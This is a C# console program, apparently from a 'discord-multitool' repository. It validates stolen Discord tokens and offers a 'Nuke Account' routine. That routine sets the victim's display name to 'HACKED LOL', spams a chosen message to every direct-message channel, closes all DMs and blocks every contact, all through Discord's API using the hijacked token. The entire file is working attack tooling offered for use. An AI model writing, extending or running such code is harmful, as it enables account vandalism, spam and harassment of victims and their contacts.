using System;
using System.Net;
using System.Runtime;
using System.Security.Cryptography;
using System.Text;
using Newtonsoft.Json;

public class Program
{
    public static async Task Main()
    {
        Console.Clear();
        Console.WriteLine("Checking for updates...");
        HttpResponseMessage latestVersionResponse = await new HttpClient().GetAsync("https://raw.githubusercontent.com/stanmarshvr/discord-multitool/main/version.txt");
        if (latestVersionResponse.IsSuccessStatusCode)
        {
            string latestVersion = await latestVersionResponse.Content.ReadAsStringAsync();
            string currentVersion = "1.0";
            Console.WriteLine("Successfully pulled latest version from Github.");
            Console.WriteLine("Current version: " + currentVersion);
            Console.WriteLine("Latest Version: " + latestVersion);
            if (currentVersion != latestVersion)
            {
                Console.WriteLine("Your version is outdated. To get the latest version, please download it from https://github.com/stanmarshvr/discord-multitool/releases/latest (I may add auto updates soon, but currently you have to manually update).");
            }
        }
        else
        {
            Console.WriteLine("FAILED to get latest version from the Github repository! The page might be down, or your internet connection might not be working. You can use the tool anyway, but you won't know if there's an update.");
        }
        Console.WriteLine("Starting tool.");
        await Task.Delay(1000);
        Console.Clear();
        while (true)
        {
            Console.WriteLine(@"
                        
    ████╗░░███╗██╗░░░██╗██╗░░░░░████████╗██╗████████╗░█████╗░░█████╗░██╗░░░░░
    ████╗░████║██║░░░██║██║░░░░░╚══██╔══╝██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
    ██╔████╔██║██║░░░██║██║░░░░░░░░██║░░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░
    ██║╚██╔╝██║██║░░░██║██║░░░░░░░░██║░░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░
    ██║░╚═╝░██║╚██████╔╝███████╗░░░██║░░░██║░░░██║░░░╚█████╔╝╚█████╔╝███████╗
    ╚═╝░░░░░╚═╝░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
    (https://github.com/stanmarshvr/discord-multitool)
");
            Console.WriteLine("Please choose something:");
            Console.WriteLine(@"
1. Check Token
2. Nuke Account
            ");
            Console.Write("> ");
            string choice = Console.ReadLine();
            switch (choice)
            {
                case "1":
                    Console.WriteLine("Enter the token to check:");
                    Console.Write("> ");
                    string tokenToCheck = Console.ReadLine();
                    Console.WriteLine($"The token you entered is {await ValidToken(tokenToCheck)}!");
                    Console.WriteLine("Press enter to continue.");
                    Console.ReadLine();
                    Console.Clear();
                    break;
                case "2":
                    Console.WriteLine("Enter the token to nuke:");
                    Console.Write("> ");
                    string tokenToNuke = Console.ReadLine();
                    if (await ValidToken(tokenToNuke) == "valid")
                    {
                        Console.WriteLine("Valid token! What message would you like to spam?");
                        Console.Write("> ");
                        string spamMessageForNuke = Console.ReadLine();
                        await NukeAccount(tokenToNuke, spamMessageForNuke);
                        Console.Clear();
                        break;
                    }
                    else
                    {
                        Console.WriteLine("The token you provided is invalid. Press enter to continue.");
                        Console.ReadLine();
                        Console.Clear();
                        break;
                    }
                    
                default:
                    Console.WriteLine("Invalid choice. Press enter to continue.");
                    Console.ReadLine();
                    Console.Clear();
                    break;
            }
        }
    }

    public async static Task<string> ValidToken(string token)
    {
        using (HttpClient client = new HttpClient())
        {
            try
            {
                client.DefaultRequestHeaders.Add("Authorization", token);
                HttpResponseMessage response = await client.GetAsync("https://discord.com/api/v9/users/@me/affinities/users");
                if (response.IsSuccessStatusCode)
                {
                    client.Dispose();
                    return "valid";
                }
                else
                {
                    client.Dispose();
                    return "invalid";
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                client.Dispose();
                return "invalid";
            }
        }
    }
    public async static Task NukeAccount(string token, string spamMessage)
    {
        string profileResponseCode = await ChangeProfile(token);
        if (profileResponseCode == "OK") { Console.WriteLine("Changed bio and pronouns successfully!"); }
        else { Console.WriteLine($"Failed to change profile ({profileResponseCode}). Continuing anyway."); }
        Console.WriteLine("Changing display name is removed because it needs a captcha. If anyone can fix it let me know!");
        Console.WriteLine("Done changing profile and display name! Continuing to message spam.");
        List<Channel> channels = await GetAllDms(token);
        foreach (Channel channel in channels)
        {
            using (HttpClient spammerClient = new HttpClient())
            {
                var contentObject = new { content = spamMessage };
                string jsonContent = JsonConvert.SerializeObject(contentObject);
                HttpContent sendMessageContent = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                HttpRequestMessage requestMessageSpammer = new HttpRequestMessage(HttpMethod.Post, $"https://discord.com/api/v9/channels/{channel.id}/messages");
                requestMessageSpammer.Content = sendMessageContent;
                spammerClient.DefaultRequestHeaders.Add("Authorization", token);
                HttpResponseMessage sendMessageResponse = await spammerClient.PostAsync($"https://discord.com/api/v9/channels/{channel.id}/messages", sendMessageContent);
                if (sendMessageResponse.IsSuccessStatusCode)
                {
                    Console.WriteLine($"[MESSAGE SPAMMER]: Successfully sent \"{spamMessage}\" to channel ID {channel.id}. Continuing.");
                }
                else
                {
                    Console.WriteLine($"[MESSAGE SPAMMER]: FAILED to send \"{spamMessage}\" to channel ID {channel.id} ({sendMessageResponse.StatusCode.ToString()}). Continuing anyway.");
                }
            }
        }
        Console.WriteLine("Done spamming messages in DMs! Now closing and blocking all DMs.");
        foreach (Channel channel in channels)
        {
            using (HttpClient blockAndCloseClient = new HttpClient())
            {
                HttpRequestMessage closeDmRequest = new HttpRequestMessage(HttpMethod.Delete, $"https://discord.com/api/v9/channels/{channel.id}?silent=false");
                blockAndCloseClient.DefaultRequestHeaders.Add("Authorization", token);
                HttpResponseMessage closeDmResponse = await blockAndCloseClient.SendAsync(closeDmRequest);
                if (closeDmResponse.IsSuccessStatusCode)
                {
                    Console.WriteLine($"Successfully closed DM (Channel ID: {channel.id})");
                }
                else
                {
                    Console.WriteLine($"Failed to close DM (Channel ID: {channel.id}). Continuing anyway.");
                }
                List<Recipient> userToBlock = channel.recipients;
                foreach (Recipient recipient in userToBlock)
                {
                    HttpContent blockUserContent = new StringContent(JsonConvert.SerializeObject(new { type = "2" }), Encoding.UTF8, "application/json");
                    HttpRequestMessage blockUserRequest = new HttpRequestMessage(HttpMethod.Put, $"https://discord.com/api/v9/users/@me/relationships/{recipient.id}");
                    blockUserRequest.Content = blockUserContent;
                    HttpResponseMessage blockUserResponse = await blockAndCloseClient.SendAsync(blockUserRequest);
                    if (blockUserResponse.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"Successfully blocked user (ID: {recipient.id})");
                    }
                    else
                    {
                        Console.WriteLine($"Failed to block user id {recipient.id} (status code: {blockUserResponse.StatusCode.ToString()}). Continuing anyway.");
                    }
                }
            }
        }
        Console.WriteLine("Done nuking account! Press enter to continue.");
        Console.ReadLine();
        Console.Clear();
    }

    public async static Task<string> ChangeProfile(string token)
    {
        using (HttpClient Client = new HttpClient())
        {
            var contentObject = new { globalName = "HACKED LOL" };
            string jsonContent = JsonConvert.SerializeObject(contentObject);
            HttpContent httpContent = new StringContent(jsonContent, Encoding.UTF8, "application/json");
            HttpRequestMessage requestMessage = new HttpRequestMessage(HttpMethod.Patch, "https://discord.com/api/v9/users/%40me/profile");
            Client.DefaultRequestHeaders.Add("Authorization", token);
            requestMessage.Content = httpContent;
            HttpResponseMessage changeProfileResponse = await Client.SendAsync(requestMessage);
            return changeProfileResponse.StatusCode.ToString();
        }
    }

    public async static Task<List<Channel>> GetAllDms(string token)
    {
        using (HttpClient Client = new HttpClient())
        {
            HttpRequestMessage alldmsrequest = new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v9/users/@me/channels");
            alldmsrequest.Headers.Add("Authorization", token);
            HttpResponseMessage allDmsResponse = await Client.SendAsync(alldmsrequest);
            if (allDmsResponse.IsSuccessStatusCode)
            {
                List<Channel> channels = JsonConvert.DeserializeObject<List<Channel>>(await allDmsResponse.Content.ReadAsStringAsync());
                return channels;
            }
            else
            {
                return null;
            }
        }
    }
}


public class Recipient
{
    public string id { get; set; }
}

public class Channel
{
    public string id { get; set; }
    public List<Recipient> recipients { get; set; }
}